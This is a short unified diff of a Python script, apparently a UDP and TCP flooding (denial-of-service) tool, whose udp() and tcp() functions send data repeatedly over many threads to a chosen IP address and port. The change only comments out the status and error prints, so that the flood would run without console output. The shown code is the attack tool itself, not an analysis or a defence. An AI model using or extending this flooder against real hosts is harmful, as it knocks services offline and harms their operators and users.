@@ -1,4 +1,5 @@
 #Author: Menesay
+#prints are commented.
 
 import socket
 import random
@@ -32,10 +33,10 @@ def udp():
                 addr = (str(ip),int(port))
                 for x in range(times):
                     s.sendto(data,addr)
-                print(i +"UDP Sent!!!")
+                #print(i +"UDP Sent!!!")
             except:
                 s.close()
-                print("[!] Error!!!")
+                #print("[!] Error!!!")
 
 
 def tcp():
@@ -49,10 +50,10 @@ def tcp():
                 s.send(data)
                 for x in range(times):
                     s.send(data)
-                print(i +"TCP Sent!!!")
+                #print(i +"TCP Sent!!!")
             except:
                 s.close()
-                print("[*] Error")
+                #print("[*] Error")
 
 def new():
         global ip, port, choice, times, threads, attack
